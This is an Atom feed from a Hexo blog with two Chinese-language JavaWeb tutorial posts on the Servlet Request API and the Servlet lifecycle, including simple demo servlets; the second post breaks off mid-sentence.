<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-06-23T13:43:20.587Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JavaWeb-Request&amp;Response</title>
    <link href="http://example.com/post/JavaWeb-Request-Response.html"/>
    <id>http://example.com/post/JavaWeb-Request-Response.html</id>
    <published>2022-06-23T13:40:26.000Z</published>
    <updated>2022-06-23T13:43:20.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a class="markdownIt-Anchor" href="#1-概述">#</a> 1、概述</h1><ul><li>Request：<mark>获取</mark>请求数据</li><li>Response：<mark>设置</mark>响应数据</li><li>Request：<ul><li>Request 继承体系</li><li>Request 获取请求数据</li><li>Request 请求转发</li></ul></li></ul><h1 id="2-request继承体系"><a class="markdownIt-Anchor" href="#2-request继承体系">#</a> 2、Request 继承体系</h1><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623155502562.png" alt="image-20220623155502562"></p><ul><li>实现类由 tomcat 提供</li><li>Tomcat 需要解析请求数据，封装为 request 对象，并且创建 request 对象传递到 service 方法中</li><li>使用 request 对象，查阅 JavaEE API 文档的 HttpServletRequest 接口就行，因为 tomcat 是实现这个接口</li><li>Request 对象全名：<mark>org.apache.catalina.connector.RequestFacade@289d4a7</mark></li></ul><h1 id="3-request获取请求数据"><a class="markdownIt-Anchor" href="#3-request获取请求数据">#</a> 3、Request 获取请求数据</h1><h2 id="31-请求行"><a class="markdownIt-Anchor" href="#31-请求行">#</a> 3.1 请求行</h2><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;request-demo&#x2F;req1?username&#x3D;zhangsan HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>请求方式 资源路径 请求参数 版本</li></ul><table><thead><tr><th>方法</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>String getMethod();</td><td>获取请求方式</td><td>get</td></tr><tr><td>String getContextPath();</td><td>获取虚拟目录（项目访问路径）</td><td>/request-demo</td></tr><tr><td>StringBuffer getRequestURL();</td><td>获取 URL（统一资源定位符）</td><td><a href="http://localhost:8080/request-demo/req1">http://localhost:8080/request-demo/req1</a></td></tr><tr><td>String getRequestURI();</td><td>获取 URI（统一资源标识符）</td><td>/request-demo/req1</td></tr><tr><td>String getQueryString();</td><td>获取请求参数（get 方式）</td><td>username=zhangsan&amp;password=123</td></tr></tbody></table><h2 id="32-请求头"><a class="markdownIt-Anchor" href="#32-请求头">#</a> 3.2 请求头</h2><pre class="line-numbers language-none"><code class="language-none">User-Agent:Mozilla&#x2F;5.0 Chrome&#x2F;91.0.4472.106<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>String getHeader(String name);</td><td>根据请求头名称，获取值</td></tr></tbody></table><h2 id="33-请求体"><a class="markdownIt-Anchor" href="#33-请求体">#</a> 3.3 请求体</h2><pre class="line-numbers language-none"><code class="language-none">username&#x3D;zhangsan&amp;password&#x3D;123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ServletInputStream getInputStream (); 获取字节输入流 —— <mark>上传文件</mark></li><li>BufferedReader getReader (); 获取字符输入流 —— <mark>纯文本</mark></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>web</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/req-demo2"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletRequestDemo2</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//浏览器的版本信息</span>        <span class="token class-name">String</span> header <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"user-agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//获取post请求体</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//读取数据</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="34-通用方式获取请求参数"><a class="markdownIt-Anchor" href="#34-通用方式获取请求参数">#</a> 3.4 通用方式获取请求参数</h2><ul><li>请求参数获取方式：<ul><li>GET 方式： <code>String getQueryString()</code></li><li>POST 方式： <code>BufferedReader getReader()</code></li></ul></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623205518967.png" alt="image-20220623205518967"></p><ul><li>Map&lt;String, String []&gt; getParameterMap (): 获取所有参数 Map 集合</li><li>String [] getParameterValues (String name): 根据名称获取参数值 (数组)</li><li>String getParameter (String name): 根据名称获取参数值 (单个值)</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>web</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/req-demo3"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletRequestDemo3</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//GET请求逻辑</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"get..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//1.获取所有参数的map集合</span>        <span class="token class-name">Map</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> parameterMap <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> key <span class="token operator">:</span> parameterMap<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//获取值</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> parameterMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> value <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取数组</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> parameterValues <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token string">"hobby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> parameterValue <span class="token operator">:</span> parameterValues<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parameterValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//根据key获取单个参数值</span>        <span class="token class-name">String</span> parameter <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"hobby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> uusername <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>uusername<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//post请求逻辑</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><mark>最常用的就是 getParameter</mark></li></ul><h2 id="35-请求参数中文乱码处理"><a class="markdownIt-Anchor" href="#35-请求参数中文乱码处理">#</a> 3.5 请求参数中文乱码处理</h2><ol><li>POST</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//在前面加一行</span>req<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置字符输入流的编码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>GET</li></ol><ul><li>get 获取参数的方式：getQueryString</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623212517551.png" alt="image-20220623212517551"></p><ul><li>做法：将解码后的数据再变成字节数据，再将字节数据使用 UTF-8 解码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> username<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"ISO-8859-1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>username <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-概述&quot;&gt;#&lt;/a&gt; 1、概述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Request：&lt;mark&gt;获取&lt;/mark&gt;请求数据&lt;/li&gt;
&lt;li&gt;Response：&lt;mark&gt;设置&lt;/mar</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-Servlet</title>
    <link href="http://example.com/post/JavaWeb-Servlet.html"/>
    <id>http://example.com/post/JavaWeb-Servlet.html</id>
    <published>2022-06-23T13:39:08.000Z</published>
    <updated>2022-06-23T13:44:15.468Z</updated>
    
    <content type="html"><![CDATA[<ul><li>快速入门</li><li>Servlet 执行流程</li><li>Servlet 生命周期</li><li>Servlet 体系结构</li><li>Servlet URLPattern 配置</li><li>XML 配置方式编写 Servlet</li></ul><h1 id="1-快速入门"><a class="markdownIt-Anchor" href="#1-快速入门">#</a> 1、快速入门</h1><ol><li>创建 web 项目，导入 servlet 依赖坐标</li><li>定义一个类，实现 Servlet 接口，并重写接口中所有方法，并在 service 方法中输入一句话</li><li>在类上使用 @WebServlet 注解，配置该 Servlet 访问路径</li><li>访问：启动 Tomcat，浏览器输入 url 访问 Servlet</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>web</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/demo1"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletDemo1</span> <span class="token keyword">implements</span> <span class="token class-name">Servlet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">ServletDemo1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CloneNotSupportedException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">ServletConfig</span> servletConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">ServletConfig</span> <span class="token function">getServletConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Servlet hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getServletInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2-servlet执行流程"><a class="markdownIt-Anchor" href="#2-servlet执行流程">#</a> 2、Servlet 执行流程</h1><ol><li>Servlet 由谁创建？Servlet 由谁调用？<ul><li>Servlet 由 web 服务器创建，Servlet 方法由 web 服务器调用</li></ul></li><li>服务器怎么知道 Servlet 中一定有 Service 方法？<ul><li>因为我们自定义的 Servlet，必须实现 Servlet 接口并复写其方法，而 Servlet 接口中有 service 方法</li></ul></li></ol><h1 id="3-生命周期"><a class="markdownIt-Anchor" href="#3-生命周期">#</a> 3、生命周期</h1><ul><li>对象的生命周期指一个对象从被创建到被销毁的整个过程</li><li>Servlet 运行在 Servlet 容器 (web 服务器) 中，其生命周期由容器来管理，分为 4 个阶段：</li></ul><ol><li><mark>加载和实例化</mark>：默认情况下，当 Servlet 第一次被访问时，由容器创建 Servlet 对象</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">默认情况，Servlet会在第一次访问被容器创建，但是如果创建Servlet比较耗时的话，那么第一个访问的人等待的时间就比较长，用户的体验就比较差，那么我们能不能把Servlet的创建放到服务器启动的时候来创建，具体如何来配置?@WebServlet(urlPatterns = "/demo1",loadOnStartup = 1)loadOnstartup的取值有两类情况（1）负整数:第一次访问时创建Servlet对象（2）0或正整数:服务器启动时创建Servlet对象，数字越小优先级越高<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><mark>初始化</mark>：在 Servlet 实例化之后，容器将调用 Servlet 的<mark> init ()<mark> 方法初始化这个对象，完成一些如加载配置文件、创建连接等初始化的工作。该方法只</mark>调用一次</mark></li><li><mark>请求处理</mark>：<mark>每次</mark>请求 Servlet 时，Servlet 容器都会调用 Servlet 的 ==service ()== 方法对请求进行处理</li><li><mark>服务终止</mark>：当需要释放内存或者容器关闭时，容器就会调用 Servlet 实例的 ==destroy ()== 方法完成资源的释放。在 destroy () 方法调用之后，容器会释放这个 Servlet 实例，该实例随后会被 Java 的垃圾收集器所回收</li></ol><h1 id="4-方法介绍"><a class="markdownIt-Anchor" href="#4-方法介绍">#</a> 4、方法介绍</h1><ul><li>初始化方法，在 Servlet 被创建时执行，只执行一次</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">ServletConfig</span> config<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>提供服务方法，每次 Servlet 被访问，都会调用该方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>销毁方法，当 Servlet 被销毁时，调用该方法，在内存释放或服务器关闭时销毁 Servlet</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">destory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>获取 ServletConfig 对象</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ServletConfig</span> <span class="token function">getServletConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>获取 Servlet 信息</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> <span class="token function">getServletInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5-servlet体系结构"><a class="markdownIt-Anchor" href="#5-servlet体系结构">#</a> 5、Servlet 体系结构</h1><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623105110152.png" alt="image-20220623105110152"></p><p>我们将来开发 B/S 架构的 